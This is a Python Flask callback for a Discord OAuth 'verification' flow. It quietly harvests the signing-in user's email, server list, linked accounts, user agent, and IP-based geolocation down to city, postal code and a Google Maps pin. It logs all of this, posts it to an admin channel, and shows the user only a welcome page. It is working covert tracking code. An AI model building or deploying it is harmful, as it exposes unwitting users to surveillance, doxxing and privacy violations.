@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }
    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()

    # サーバー参加処理
    requests.put(
        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
        headers={
            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
            "Content-Type": "application/json"
        },
        json={"access_token": access_token}
    )

    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
        if user.get("avatar")
        else "https://cdn.discordapp.com/embed/avatars/0.png"
    )

    # 整理済データ構造
    structured_data = {
        "discord": {
            "username": user.get("username"),
            "discriminator": user.get("discriminator"),
            "id": user.get("id"),
            "email": user.get("email"),
            "avatar_url": avatar_url,
            "locale": user.get("locale"),
            "verified": user.get("verified"),
            "mfa_enabled": user.get("mfa_enabled"),
            "premium_type": user.get("premium_type"),
            "flags": user.get("flags"),
            "public_flags": user.get("public_flags"),
            "guilds": guilds,
            "connections": connections
        },
        "ip_info": geo,
        "user_agent": {
            "raw": ua_raw,
            "os": ua.os.family,
            "browser": ua.browser.family,
            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
            "is_bot": ua.is_bot
        }
    }

    save_log(user["id"], structured_data)

    # Embed形式で送信
    try:
        d = structured_data["discord"]
        ip = structured_data["ip_info"]
        ua = structured_data["user_agent"]

        embed_data = {
            "title": "📥 新しいアクセスログ",
            "description": (
                f"👤 **ユーザー情報**\n"
                f"・名前: `{d['username']}#{d['discriminator']}`\n"
                f"・ID: `{d['id']}`\n"
                f"・メール: `{d['email']}`\n"
                f"・Locale: `{d['locale']}` / Premium: `{d['premium_type']}`\n\n"

                f"🌐 **IP & 地理情報**\n"
                f"・IP: `{ip['ip']}`\n"
                f"・Proxy: `{ip['proxy']}` / Hosting: `{ip['hosting']}`\n"
                f"・国: `{ip['country']}` / 地域: `{ip['region']}` / 市: `{ip['city']}` / 郵便: `{ip['zip']}`\n"
                f"・ISP: `{ip['isp']}` / AS: `{ip['as']}`\n"
                f"・📍 [Google Map](https://www.google.com/maps?q={ip['lat']},{ip['lon']})\n\n"

                f"💻 **端末情報**\n"
                f"・OS: `{ua['os']}` / ブラウザ: `{ua['browser']}`\n"
                f"・デバイス: `{ua['device']}` / Bot判定: `{ua['is_bot']}`\n"
                f"・UA: ```{ua['raw']}```"
            ),
            "thumbnail": {"url": d["avatar_url"]},
            "color": 0x3498db
        }

        bot.loop.create_task(bot.send_log(embed=embed_data))

        # ⚠️ VPN・ホスティング警告用Embed
        if ip["proxy"] or ip["hosting"]:
            warn_embed = {
                "title": "⚠️ 不審なアクセス検出",
                "description": (
                    f"**ユーザー:** `{d['username']}#{d['discriminator']}`\n"
                    f"**ID:** `{d['id']}`\n"
                    f"**IP:** `{ip['ip']}`\n"
                    f"**Proxy:** `{ip['proxy']}` / Hosting: `{ip['hosting']}`\n"
                    f"📍 [Google Map](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
                ),
                "color": 0xff4d4d  # 赤
            }
            bot.loop.create_task(bot.send_log(embed=warn_embed))

        # ロール付与
        bot.loop.create_task(bot.assign_role(d["id"]))

    except Exception as e:
        print("Embed送信エラー:", e)

    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
